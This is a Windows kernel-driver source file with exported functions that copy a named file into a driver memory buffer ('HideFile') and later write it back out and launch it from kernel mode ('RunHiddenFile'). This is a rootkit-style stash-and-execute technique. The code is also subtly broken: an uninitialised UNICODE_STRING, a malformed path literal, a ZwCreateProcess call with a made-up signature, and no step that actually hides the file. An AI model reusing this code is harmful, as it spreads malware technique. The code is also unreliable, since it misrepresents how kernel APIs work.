#include <ntddk.h>

#define FILE_BUFFER_SIZE 0x1000

UCHAR fileBuffer[FILE_BUFFER_SIZE];
ULONG fileSize;
UNICODE_STRING fileName;

/**
  * @brief     Function to hide a file by storing it in the driver's memory space
  * @param[in] pFileName : UNICODE_STRING : File name to be hidden
  * @return    NTSTATUS : Status of the operation
  */
extern "C" __declspec(dllexport) NTSTATUS HideFile(PUNICODE_STRING pFileName)
{
    // Open the file
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    InitializeObjectAttributes(&objectAttributes, pFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS status = ZwCreateFile(&fileHandle, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Failed to open file %wZ, status: 0x%08x", pFileName, status);
        return status;
    }

    fileSize = 0;
    do
    {
        ULONG bytesRead;
        status = ZwReadFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, fileBuffer + fileSize, FILE_BUFFER_SIZE - fileSize, NULL, NULL);
        if (!NT_SUCCESS(status))
        {
            DbgPrint("Failed to read file %wZ, status: 0x%08x", pFileName, status);
            ZwClose(fileHandle);
            return status;
        }

        bytesRead = (ULONG)ioStatusBlock.Information;
        fileSize += bytesRead;
    } while (ioStatusBlock.Information == FILE_BUFFER_SIZE);

    // Close the file
    ZwClose(fileHandle);

    // Save the file name
    RtlInitUnicodeString(&fileName, pFileName->Buffer);

    // Return success
    return STATUS_SUCCESS;
}

/**
  * @brief     Function to run the hidden file
  * @return    NTSTATUS : Status of the operation
  */
extern "C" __declspec(dllexport) NTSTATUS RunHiddenFile()
{
    if (fileSize == 0)
    {
        DbgPrint("No hidden file to run");
        return STATUS_UNSUCCESSFUL;
    }

    // Create a temporary file with the hidden file's data
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING tempFileName;
    WCHAR tempFileNameBuffer[MAX_PATH];
    RtlSecureZeroMemory(tempFileNameBuffer, sizeof(tempFileNameBuffer));
    RtlAppendUnicodeToString(&tempFileName, L"\??\\");
    RtlAppendUnicodeStringToString(&tempFileName, &fileName);
    InitializeObjectAttributes(&objectAttributes, &tempFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    NTSTATUS status = ZwCreateFile(&fileHandle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Failed to create temporary file %wZ, status: 0x%08x", &tempFileName, status);
        return status;
    }

    status = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, fileBuffer, fileSize, NULL, NULL);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Failed to write to temporary file %wZ, status: 0x%08x", &tempFileName, status);
        ZwClose(fileHandle);
        return status;
    }

    ZwClose(fileHandle);

    status = ZwCreateProcess(&fileHandle, PROCESS_ALL_ACCESS, NULL, ZwCurrentProcess(), TRUE, &tempFileName, NULL, NULL);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("Failed to run temporary file %wZ, status: 0x%08x", &tempFileName, status);
        return status;
    }

    return STATUS_SUCCESS;
}
